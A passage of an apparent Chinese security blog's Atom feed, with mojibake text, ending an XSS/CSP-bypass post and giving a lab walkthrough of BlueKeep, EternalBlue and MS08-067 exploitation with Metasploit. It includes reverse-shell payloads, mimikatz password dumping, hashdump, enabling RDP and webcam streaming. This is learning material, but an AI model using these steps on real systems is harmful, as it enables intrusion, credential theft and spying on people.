src=//xs.sb/idqS&gt;&lt;/script&gt;</code></p><p><strong>ä¾‹å­å››</strong></p><p>è¿™ä¸ªä¾‹å­æ˜¯ä¸€ä¸ªæ¥è‡ªæˆ‘åœ¨æ¨ç‰¹ä¸Šçœ‹åˆ°ä¸€ä½å¸ˆå‚…çš„éªšæ“ä½œï¼Œç„¶åä»¥è¿™ä¸ªä¾‹å­å‡ºäº†ä¸€ä¸ªcspç»•è¿‡çš„é¢˜ç›®ã€‚æœ¬è´¨ä¸Šå°±æ˜¯è¿™ä¸ªä¾‹å­XD</p><p><img src="https://s2.ax1x.com/2019/09/15/nguaA1.png" alt="nguaA1.png" style="zoom:50%;"></p><p>è¿™ä½å¸ˆå‚…ä¹Ÿå·²ç»è¯´å¾—å¾ˆæ¸…æ¥šäº†ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨<code>%2f</code>ä»£æ›¿<code>/</code>çš„æ—¶å€™å°±ä¼šæœ‰ä¸€ä¸ªç»•è¿‡çš„æ•ˆæœï¼Œå¹¶ä¸”å›¾ä¸­çš„<code>XYZ</code>æ˜¯å¯ä»¥ä»»æ„æ›¿æ¢çš„ã€‚å®é™…ä¸Šæˆ‘ä»¬å¼•å…¥çš„å†…å®¹æ˜¯è¿™ä¸ªç«™ç‚¹ä¸‹çš„å†…å®¹ï¼š<code>https://pastebin.com/raw/b0Rajxqk</code>ï¼Œé‡Œé¢çš„å†…å®¹å°±æ˜¯ä¸€ä¸ª<code>alert(1)</code></p><p>æˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.ax1x.com/2019/09/15/ngKLse.png" alt="ngKLse.png" style="zoom:67%;"></p><p><strong>ä¾‹å­äº”</strong></p><p>è¿™ä¸ªä¾‹å­æ˜¯ç»“åˆäº†ä¸Šé¢çš„ä¾‹å­ä¸‰ä»¥åŠæœ¬ç¯‡æ–‡ç« çš„å†…å®¹ï¼Œè¿™é‡Œæˆ‘æ˜¯å°†æ‰€æœ‰è¾“å…¥çš„å†…å®¹å«æœ‰<code>%2f</code>è¿›è¡Œäº†å¤„ç†ï¼ŒæŠŠå«æœ‰<code>%2f</code>éƒ½ä¼šåˆ æ‰ï¼Œè¿™é‡Œéœ€è¦ä½¿ç”¨æœ¬æ–‡çš„ä¸€ä¸ªå†…å®¹ï¼Œå°±æ˜¯åˆ©ç”¨æµè§ˆå™¨çš„è§£æé¡ºåºï¼Œè€Œä¸”æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°è¿™é‡Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹éƒ½ä¼šè¿›å…¥åˆ°srcå±æ€§é‡Œé¢å»ï¼Œä¸Šæ–‡è¯´åˆ°åœ¨å±æ€§å€¼çŠ¶æ€ä¸­HTMLå­—ç¬¦å®ä½“å°†ä¼šä»â€œ&amp;#â€¦â€å½¢å¼è§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨HTMLå®ä½“ç¼–ç å»è¿›è¡Œä¸€ä¸ªç»•è¿‡ã€‚</p><p>ä½¿ç”¨çš„æ˜¯<code>%</code>çš„ä¸€ä¸ªhtmlç¼–ç è¿›è¡Œç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯<code>&amp;percnt;</code></p><p><img src="https://s2.ax1x.com/2019/09/15/ng1QQf.png" alt="ng1QQf.png" style="zoom:50%;"></p><p>è§¦å‘æ•ˆæœï¼š</p><p><img src="https://s2.ax1x.com/2019/09/15/ng10yT.png" alt="ng10yT.png"></p><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://saucer-man.com/information_security/103.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/103.html</a></p><p><a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h3&gt;&lt;p&gt;æœ€è¿‘çœ‹äº†ä¸€äº›xssåˆ©ç”¨æ–¹å¼ï¼Œå‘ç°æœ¬äººåœ¨ä»¥å‰å¯¹ç¼–ç ç»•è¿‡è¿™ä¸€ä¸ªç‚¹çš„åŸç†å¥½åƒæ²¡æœ‰å¤ªæœ¬è´¨æ€§çš„ç†è§£ï¼Œæ‰€ä»¥å°±æœ‰äº†è¿™ç¯‡æ–‡ç« ï¼Œå¯¹æµè§ˆå™¨è¿›è¡Œè§£æçš„é¡ºåºæœ‰ä¸€ä¸ªè®°å½•ï¼Œä¹Ÿä»ä¸­æ”¶è·åˆ°ç‚¹ä¸œè¥¿ï¼Œå‡†å¤‡æ ¡èµ›å‡ºä¸€ä¸ªé¢˜ç›®å…³äºè¿™ä¸ªå†…å®¹
    
    </summary>
    
      <category term="xss" scheme="0verwatch.top/categories/xss/"/>
    
    
      <category term="xss" scheme="0verwatch.top/tags/xss/"/>
    
      <category term="bypass" scheme="0verwatch.top/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708ï¼ŒMS17-010ï¼ŒMS08-067æ¼æ´å¤ç°</title>
    <link href="0verwatch.top/msf-cve-review.html"/>
    <id>0verwatch.top/msf-cve-review.html</id>
    <published>2019-09-10T15:25:17.000Z</published>
    <updated>2019-09-10T15:34:34.584Z</updated>
    
    <content type="html"><![CDATA[<p>è™½ç„¶ç½‘ä¸Šéƒ½ä¸€å¤§å †äº†ï¼Œæœ‰äº›è‡ªå·±è¸©è¿‡çš„è¿˜æ˜¯è¦è®°å½•ä¸€ä¸‹ï¼Œæ¯•ç«Ÿæœ‰ç”¨<a id="more"></a>ã€‚</p><h3 id="CVE-2019-0708-BlueKeep"><a href="#CVE-2019-0708-BlueKeep" class="headerlink" title="CVE-2019-0708 (BlueKeep)"></a>CVE-2019-0708 (BlueKeep)</h3><p>è¿œç¨‹æ¡Œé¢æœåŠ¡ï¼ˆä»¥å‰ç§°ä¸ºç»ˆç«¯æœåŠ¡ï¼‰ä¸­å­˜åœ¨è¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ï¼Œå½“æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä½¿ç”¨RDPè¿æ¥åˆ°ç›®æ ‡ç³»ç»Ÿå¹¶å‘é€ç‰¹åˆ¶è¯·æ±‚æ—¶ã€‚æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚windows2003ã€windows2008ã€windows2008 R2ã€windows xpç³»ç»Ÿéƒ½ä¼šé­åˆ°æ”»å‡»ã€‚</p><h4 id="æ¼æ´ç¯å¢ƒ"><a href="#æ¼æ´ç¯å¢ƒ" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h4><p>ç”±äºç°é˜¶æ®µçš„expåªèƒ½åœ¨win7 sp1ç‰ˆæœ¬å’Œwin 2008 R2ç‰ˆæœ¬èµ·ä½œç”¨ï¼Œè¿™é‡Œé€‰æ‹©win7  sp1 ï¼Œç»æœ¬äººæµ‹è¯•ï¼Œè¯¥expåˆ©ç”¨æˆåŠŸç‡ä¸å¤ªé«˜ï¼Œç»å¸¸æ€§ no session was createdï¼Œå»ºè®®åˆ©ç”¨ä¸€æ¬¡å»ºè®®è¯•ä¸€æ¬¡é‡å¯é¶æœºä¸€æ¬¡ï¼Œæé«˜æˆåŠŸç‡ã€‚</p><p><strong>æ”»å‡»æœº</strong>ï¼škali  IP:192.168.70.152ï¼ˆæ³¨æ„metasploitæœ€å¥½æ›´æ–°åˆ°5.xä»¥ä¸Šç‰ˆæœ¬ä¸ç„¶å¯èƒ½ä¼šå‡ºé”™ï¼‰<br><strong>é¶æœº</strong>ï¼š win7   IP:192.168.70.153ï¼ˆå¼€æ”¾3389ç«¯å£ï¼Œå…³é—­é˜²ç«å¢™ï¼‰</p><h4 id="å·¥å…·å‡†å¤‡"><a href="#å·¥å…·å‡†å¤‡" class="headerlink" title="å·¥å…·å‡†å¤‡"></a>å·¥å…·å‡†å¤‡</h4><p>ç°é˜¶æ®µexpè¿˜æ²¡æœ‰å¹¶å…¥msfä¸­ï¼Œéœ€è¦è‡ªå·±ä¸‹è½½å¯¼å…¥ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/</span><br><span class="line">cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/</span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/</span><br><span class="line">cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</span><br></pre></td></tr></table></figure><h4 id="å¤ç°è¿‡ç¨‹"><a href="#å¤ç°è¿‡ç¨‹" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h4><p>æ‰«ä¸€ä¸‹ç›®æ ‡ä¸»æœºç¡®è®¤å…¶å¼€æ”¾3389ç«¯å£</p><p><img src="https://s2.ax1x.com/2019/09/09/ntV61J.png" alt="ntV61J.png"></p><p>è¿›å…¥msfåä½¿ç”¨<code>reload_all</code>é‡æ–°åŠ è½½0708rdpåˆ©ç”¨æ¨¡å—ï¼Œ</p><p><img src="https://s2.ax1x.com/2019/09/09/ntn656.png" alt="ntn656.png"></p><p>ä½¿ç”¨å‘½ä»¤<code>search 0708</code> æŸ¥æ‰¾ç›¸å…³æ¨¡å—ï¼Œç¬¬ä¸€ä¸ªå’Œç¬¬å››ä¸ªåˆ†åˆ«æ˜¯æ‰«æå’Œåˆ©ç”¨çš„æ¨¡å—</p><p><img src="https://s2.ax1x.com/2019/09/09/ntu9I0.png" alt="ntu9I0.png"></p><p> å¯ä»¥å…ˆä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—å»æ‰«æé¶æœºæ˜¯å¦å­˜åœ¨å½“å‰æ¼æ´ï¼Œä½¿ç”¨<code>info</code>æŸ¥è¯¢æˆ‘ä»¬éœ€è¦é…ç½®çš„å†…å®¹ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦é…ç½®è¿œç¨‹ipåœ°å€rhostså±æ€§å³å¯ï¼Œé»˜è®¤3389ç«¯å£ï¼Œä¸éœ€è¦ä¿®æ”¹</p><p><img src="https://s2.ax1x.com/2019/09/09/ntuQJK.png" alt="ntuQJK.png"></p><p><code>set rhosts 192.168.70.153</code>ä¹‹åå°±å¯ä»¥æ„‰å¿«åœ°runäº†ï¼Œå¯ä»¥å‘ç°å­˜åœ¨è¯¥æ¼æ´</p><p><img src="https://s2.ax1x.com/2019/09/09/ntu2oq.png" alt="ntu2oq.png">ä¹‹åæ¢å¦å¤–ä¸€ä¸ªåˆ©ç”¨çš„æ¨¡å—ï¼Œ<code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code>ï¼ŒåŒæ ·å¯ä»¥å…ˆä½¿ç”¨infoæŸ¥çœ‹éœ€è¦é…ç½®çš„ç›¸å…³å±æ€§ï¼Œé™¤äº†è·Ÿåˆšæ‰ä¸€æ ·çš„è®¾ç½®ipçš„å±æ€§ï¼Œè¿˜è¦æ³¨æ„è¿™ä¸ªæ¨¡å—å­˜åœ¨è¿™æ ·çš„ä¸€ä¸ªtargetå±æ€§ï¼Œè¿™æ˜¯ä¸€ä¸ªå‘ç‚¹ï¼Œè¿™é‡Œè§„å®šäº†é¶æœºçš„æ¶æ„ï¼Œè¿™é‡Œæˆ‘æ˜¯åœ¨è™šæ‹Ÿæœºé‡Œé¢å®Œæˆçš„æ‰€ä»¥é€‰æ‹©3ï¼Œå‘½ä»¤å°±æ˜¯<code>set target 3</code></p><p><img src="https://s2.ax1x.com/2019/09/09/ntKRnH.png" alt="ntKRnH.png"></p><p>å¦‚æœç›´æ¥é»˜è®¤ä¼šæ€æ ·ï¼Œå¯èƒ½å°±ä¼šå¦‚ä¸‹å›¾:)ï¼Œè“å±è­¦å‘Š23333ã€‚ã€‚</p><p><img src="https://s2.ax1x.com/2019/09/09/ntM4r4.png" alt="ntM4r4.png"></p><p>è®¾ç½®å¥½rhostsä¸º192.168.70.153ä¹‹årunä¸€å‘ï¼Œå¯ä»¥çœ‹åˆ°æƒé™ç›´æ¥æ˜¯systemæƒé™äº†ï¼Œä¸ºæ‰€æ¬²ä¸ºäº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/09/09/nN9PsK.png" alt="nN9PsK.png"></p><h3 id="MS17-010-æ°¸æ’ä¹‹è“"><a href="#MS17-010-æ°¸æ’ä¹‹è“" class="headerlink" title="MS17-010(æ°¸æ’ä¹‹è“)"></a>MS17-010(æ°¸æ’ä¹‹è“)</h3><p>Eternalblueé€šè¿‡TCPç«¯å£445å’Œ139æ¥åˆ©ç”¨SMBv1å’ŒNBTä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¶æ„ä»£ç ä¼šæ‰«æå¼€æ”¾445æ–‡ä»¶å…±äº«ç«¯å£çš„Windowsæœºå™¨ï¼Œæ— éœ€ç”¨æˆ·ä»»ä½•æ“ä½œï¼Œåªè¦å¼€æœºä¸Šç½‘ï¼Œä¸æ³•åˆ†å­å°±èƒ½åœ¨ç”µè„‘å’ŒæœåŠ¡å™¨ä¸­æ¤å…¥å‹’ç´¢è½¯ä»¶ã€è¿œç¨‹æ§åˆ¶æœ¨é©¬ã€è™šæ‹Ÿè´§å¸æŒ–çŸ¿æœºç­‰æ¶æ„ç¨‹åºã€‚</p><h4 id="æ¼æ´ç¯å¢ƒ-1"><a href="#æ¼æ´ç¯å¢ƒ-1" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h4><p><strong>æ”»å‡»æœº</strong>ï¼škali  IP: 192.168.70.152<br><strong>é¶æœº</strong>ï¼š win7   IP: 192.168.70.153ï¼ˆå¼€æ”¾445ç«¯å£ï¼Œå…³é—­é˜²ç«å¢™ï¼‰</p><h4 id="å¤ç°è¿‡ç¨‹-1"><a href="#å¤ç°è¿‡ç¨‹-1" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h4><p>å…ˆä½¿ç”¨nmapæ‰«æä¸€æ³¢ä¸»æœºçš„ç«¯å£å­˜æ´»æ€§ï¼Œ<code>nmap -sS -p 445 192.168.70.153</code></p><p><img src="https://s2.ax1x.com/2019/09/09/nNCDjP.png" alt="nNCDjP.png"></p><p>ä½¿ç”¨å‘½ä»¤<code>msfconsole</code>è¿›å…¥msfï¼Œç„¶å<code>search ms17-010</code>æŸ¥æ‰¾å¯¹åº”çš„æ¨¡å—ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢å­˜åœ¨å¯¹åº”çš„æ‰«ææ¨¡å—ä»¥åŠåˆ©ç”¨æ¨¡å—</p><p><img src="https://s2.ax1x.com/2019/09/09/nNCbEF.png" alt="nNCbEF.png"></p><p>ç„¶åè¿™é‡Œæˆ‘ä½¿ç”¨ç¬¬äºŒä¸ªæ¨¡å—å»æ¢æµ‹ä¸»æœºæ˜¯å¦å­˜åœ¨è¯¥æ¼æ´ï¼Œ<code>use auxiliary/scanner/smb/smb_ms17_010</code>ï¼Œç„¶åä½¿ç”¨<code>info</code>å‘½ä»¤æŸ¥çœ‹æˆ‘ä»¬æ‰€éœ€è¦é…ç½®çš„ä¸€äº›ä¿¡æ¯ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦é…ç½®çš„ä¹Ÿæ˜¯ä¸€ä¸ªrhostsï¼Œå› ä¸ºä»–çš„requiredä¹Ÿæ˜¯yesï¼Œæ˜¯å¿…é¡»çš„ï¼Œå…¶ä»–çš„ç«¯å£å·å•¥çš„ä½¿ç”¨é»˜è®¤çš„445ï¼Œå¿…è¦æ—¶å€™æˆ‘ä»¬ä¹Ÿæ˜¯éœ€è¦æ”¹å˜ç«¯å£å·çš„</p><p><img src="https://s2.ax1x.com/2019/09/09/nNPF4H.png" alt="nNPF4H.png"></p><p>ç„¶å<code>set rhosts 192.168.70.153</code> ä¹‹åæ‰§è¡Œ <code>run</code>å‘½ä»¤ï¼Œå‘ç°ç–‘ä¼¼å­˜åœ¨è¯¥æ¼æ´</p><p><img src="https://s2.ax1x.com/2019/09/10/nNPtK0.png" alt="nNPtK0.png"></p><p>ç„¶åä¸‹é¢å°±å¼€å§‹ä½¿ç”¨æ”»å‡»æ¨¡å—äº†ï¼Œè¿™æ¬¡é™¤äº†è®¾ç½®ä¸€ä¸‹lhostï¼Œrhostä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è®¾ç½®ä¸€ä¸‹payloadå±æ€§ï¼Œä½¿ç”¨ä¸€äº›msfè‡ªå¸¦çš„ä¸€äº›åå¼¹shellçš„æ¨¡å—ï¼Œæ›´å¤šåŠŸèƒ½XDï¼Œè¯¦ç»†çš„è¯æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨<code>show payloads</code>å‘½ä»¤å»æŸ¥çœ‹</p><p><img src="https://s2.ax1x.com/2019/09/10/nN8Ai9.png" alt="nN8Ai9.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost 192.168.70.152   <span class="comment">#è®¾å®šæ”»å‡»æœº</span></span><br><span class="line"><span class="built_in">set</span> rhost 192.168.70.153   <span class="comment">#è®¾å®šé¶æœº</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">run   <span class="comment">#è¿è¡Œ</span></span><br></pre></td></tr></table></figure><p>åŠŸèƒ½æˆåŠŸï¼Œå¯ä»¥ä½¿ç”¨msfä¸­<code>reverse_tcp</code>é‡Œé¢çš„ä¸€äº›å‘½ä»¤äº†</p><p><img src="https://s2.ax1x.com/2019/09/10/nNGM60.png" alt="nNGM60.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getuid<span class="comment">#æŸ¥çœ‹å½“å‰æƒé™</span></span><br><span class="line">sysinfo<span class="comment">#æŸ¥çœ‹é¶æœºä¿¡æ¯</span></span><br><span class="line">shell<span class="comment">#è·å–shell</span></span><br><span class="line">chcp 65001<span class="comment">#shellä¸­æ–‡è¯†åˆ«</span></span><br><span class="line">hashdump   <span class="comment">#å¥½åƒåªæœ‰ç®¡ç†å‘˜æ‰èƒ½ç”¨</span></span><br><span class="line"><span class="built_in">pwd</span>    <span class="comment">#æŸ¥çœ‹å½“å‰ç›®å½•</span></span><br><span class="line">ps  <span class="comment">#æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><p>emmmï¼Œæœ‰ç‚¹æ— è„‘ï¼Œä¹Ÿæ˜¯ç›´æ¥è·å¾—systemæƒé™çš„</p><p><img src="https://s2.ax1x.com/2019/09/10/nNGYtJ.png" alt="nNGYtJ.png"></p><p>ä¸»è¦åœ¨è¿™ä¸ªpayloadæ¨¡å—ä¸‹è¿˜æœ‰å…¶ä»–å¥½ç©çš„ä¸œè¥¿</p><h5 id="è·å–ç”¨æˆ·å¯†ç "><a href="#è·å–ç”¨æˆ·å¯†ç " class="headerlink" title="è·å–ç”¨æˆ·å¯†ç "></a>è·å–ç”¨æˆ·å¯†ç </h5><p>è¿™ä¸ªå¥½åƒæ˜¯åªèƒ½è·å–å½“å‰ç™»å½•çš„ç”¨æˆ·çš„ç”¨æˆ·åå¯†ç ï¼Œä¸ç„¶çš„è¯å¥½åƒåŠ è½½ä¸å‡ºæ¥å¯†ç çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz<span class="comment">#è½½å…¥mimikatz</span></span><br><span class="line">wdigest</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/10/nNGq9s.png" alt="nNGq9s.png"></p><h5 id="å¼€å¯è¿œç¨‹æ¡Œé¢"><a href="#å¼€å¯è¿œç¨‹æ¡Œé¢" class="headerlink" title="å¼€å¯è¿œç¨‹æ¡Œé¢"></a>å¼€å¯è¿œç¨‹æ¡Œé¢</h5><p>å¯ä»¥å¼€å¯3389ç«¯å£å¹¶ä¸”é¡ºä¾¿å…³æ‰é˜²ç«å¢™2333</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p>Linuxä¸‹è¿æ¥rdpï¼Œå…ˆè®°ç€ï¼Œæ€•å¿˜äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.70.153 -u user -p passw0rd</span><br></pre></td></tr></table></figure><h5 id="ä¸Šä¼ -ä¸‹è½½æ–‡ä»¶"><a href="#ä¸Šä¼ -ä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ /ä¸‹è½½æ–‡ä»¶"></a>ä¸Šä¼ /ä¸‹è½½æ–‡ä»¶</h5><p>è¿™ä¸ªä¸€èˆ¬åœ¨æœ‰å†…ç½‘çš„æ—¶å€™æ¯”è¾ƒå¥½ç”¨ï¼Œä¸Šä¼ ä¸ªä»£ç†ï¼Œæ‰«æå™¨å•¥çš„ï¼Œå¯ä»¥è¿›è¡Œå†…ç½‘æ¸—é€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download /</span><br><span class="line">upload /file</span><br></pre></td></tr></table></figure><h5 id="æˆªå±"><a href="#æˆªå±" class="headerlink" title="æˆªå±"></a>æˆªå±</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot</span><br></pre></td></tr></table></figure><h5 id="å¼€å¯æ‘„åƒå¤´"><a href="#å¼€å¯æ‘„åƒå¤´" class="headerlink" title="å¼€å¯æ‘„åƒå¤´"></a>å¼€å¯æ‘„åƒå¤´</h5><p>ä¸ªäººæœ€å–œæ¬¢è¿™ä¸ªæ“ä½œXDï¼Œä¸è§£é‡Šã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_stream</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/10/nNYZzn.png" alt="nNYZzn.png"></p><h3 id="MS-08067"><a href="#MS-08067" class="headerlink" title="MS-08067"></a>MS-08067</h3><p>æ”»å‡»è€…åˆ©ç”¨å—å®³è€…ä¸»æœºé»˜è®¤å¼€æ”¾çš„SMBæœåŠ¡ç«¯å£445ï¼Œå‘é€ç‰¹æ®ŠRPCï¼ˆRemote Procedure Call è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰è¯·æ±‚ï¼Œé€ æˆäº†æ ˆç¼“å†²åŒºå†…å­˜é”™è¯¯ï¼Œé€ æˆå¯è¢«åˆ©ç”¨å®æ–½è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å½±å“èŒƒå›´ï¼šWindowsç³»ç»Ÿï¼ŒåŒ…æ‹¬ï¼šWindows 2000/XP/Server 2003/Vista/Server 2008çš„å„ä¸ªç‰ˆæœ¬</p><h4 id="æ¼æ´ç¯å¢ƒ-2"><a href="#æ¼æ´ç¯å¢ƒ-2" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h4><p><strong>æ”»å‡»æœº</strong>ï¼škali  IP: 192.168.70.152<br><strong>é¶æœº</strong>ï¼š win xp sp2   IP: 192.168.70.155ï¼ˆå…³é—­é˜²ç«å¢™ï¼‰</p><h4 id="å¤ç°è¿‡ç¨‹-2"><a href="#å¤ç°è¿‡ç¨‹-2" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h4><p>æ ¹æ®æ¼æ´æè¿°å°±æ˜¯è¯´ä¹Ÿæ˜¯éœ€è¦æ‰“å¼€445ç«¯å£çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥ç¡®è®¤ä¸€ä¸‹445ç«¯å£æ˜¯å¦å¼€å¯</p><p><img src="https://s2.ax1x.com/2019/09/10/nUma7R.png" alt="nUma7R.png"></p><p>ç„¶å<code>msfconsole</code>è¿›å…¥msfï¼Œç„¶å<code>search 08-067</code>æŸ¥æ‰¾ç›¸å…³æ¨¡å—ï¼Œuseé‚£ä¸ªæ¨¡å—å³å¯ï¼Œä½¿ç”¨<code>info</code>æŸ¥çœ‹ç›¸å…³çš„ä¿¡æ¯</p><p><img src="https://s2.ax1x.com/2019/09/10/nN6rHH.png" alt="nN6rHH.png"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥è®¾ç½®rhostï¼Œpayloadï¼Œlhost</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 192.168.70.155</span><br><span class="line"><span class="built_in">set</span> payload  windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.70.152</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/10/nUns5q.png" alt="nUns5q.png"></p><p>è¿™é‡Œé¢çš„targetå±æ€§æˆ‘ä»¬è®¾ç½®ä¸º5ï¼Œé€‰æ‹©xp sp2çš„è‹±æ–‡ç‰ˆï¼Œå¦‚æœæ²¡é€‰å¯¹å¾ˆå¯èƒ½å‡ºç°ä¸‹é¢çš„æƒ…å†µ</p><p><img src="https://s2.ax1x.com/2019/09/10/nUmycD.png" alt="nUmycD.png"></p><p>runä¹‹åå¯ä»¥å‘ç°åŒæ ·æ˜¯systemæƒé™åˆå¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†XD</p><p><img src="https://s2.ax1x.com/2019/09/10/nUnOMD.png" alt="nUnOMD.png"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>1.æœ‰äº›å‘ç‚¹è¿˜æ˜¯éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œå…³äºset targetçš„é—®é¢˜ï¼Œæœ€å¥½è¿˜æ˜¯è‡ªå·±æ‰‹åŠ¨è®¾ç½®ä¸€ä¸‹å§ï¼Œä¸ç„¶ç›´æ¥ä½¿ç”¨é»˜è®¤çš„targetä¼šå¯èƒ½å‡ºç°å„ç§å„æ ·çš„é—®é¢˜ï¼Œæ¯•ç«Ÿè¿™äº›æ¶æ„é—®é¢˜ä¸æ˜¯æˆ‘è¿™ä¸ªæ°´å¹³æå¾—å®šçš„ï¼Œæˆ‘å¤ªèœäº†:)</p><p>2.msfå¸¸ç”¨çš„å°±é‚£å‡ ä¸ªå‘½ä»¤ï¼Œç†Ÿç»ƒå°±å¥½äº†ï¼Œå¯èƒ½è¿˜æœ‰å…¶ä»–éªšæ“ä½œï¼Œä»¥åé‡åˆ°å†å­¦å§ï¼Œä½†æ˜¯å¬è¯´åœ¨å†…ç½‘æ¸—é€çš„æ—¶å€™ä¸å¤ªç”¨ï¼Œæµé‡å¤ªå¤§äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è™½ç„¶ç½‘ä¸Šéƒ½ä¸€å¤§å †äº†ï¼Œæœ‰äº›è‡ªå·±è¸©è¿‡çš„è¿˜æ˜¯è¦è®°å½•ä¸€ä¸‹ï¼Œæ¯•ç«Ÿæœ‰ç”¨
    
    </summary>
    
      <category term="metasploit" scheme="0verwatch.top/categories/metasploit/"/>
    
    
      <category term="metasploit" scheme="0verwatch.top/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>ImageMagickå‘½ä»¤æ‰§è¡Œ</title>
    <link href="0verwatch.top/ImageMagick.html"/>
    <id>0verwatch.top/ImageMagick.html</id>
    <published>2019-06-27T11:22:28.000Z</published>
